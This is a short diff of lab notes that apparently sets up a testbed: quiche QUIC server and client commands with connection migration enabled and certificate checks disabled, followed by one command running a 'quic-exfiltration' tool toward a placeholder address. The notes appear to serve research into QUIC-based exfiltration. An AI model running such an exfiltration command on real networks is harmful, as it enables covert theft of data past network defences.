@@ -1,0 +1,12 @@
+quiche server on vm (base machine):
+
+./target/release/quiche-server --listen 192.168.100.63:4433 --root html --cert apps/src/bin/cert.crt --key apps/src/bin/cert.key --enable-active-migration
+
+quiche client inside docker container:
+
+./target/release/quiche-client https://192.168.100.63:4433/index.html --no-verify --enable-active-migration --perform-migration
+
+quic-exfil tool inside docker container:
+
+./target/release/quic-exfiltration -d "192.0.2.100" -i "eth0" -b 1000
+
